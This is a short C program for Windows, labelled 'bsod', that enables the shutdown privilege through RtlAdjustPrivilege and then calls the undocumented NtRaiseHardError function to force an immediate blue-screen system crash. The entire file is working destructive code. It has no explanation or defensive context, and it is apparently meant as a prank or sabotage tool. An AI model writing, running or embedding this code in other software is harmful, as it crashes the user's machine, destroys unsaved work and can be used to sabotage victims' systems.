//Windows bsod

#include <Windows.h>

typedef NTSTATUS(NTAPI* NtRaiseHardError_t)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

int main() {
    BOOLEAN b;
    ULONG u;
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
    RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");

    RtlAdjustPrivilege(19, TRUE, FALSE, &b);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &u);

    return 0;
}
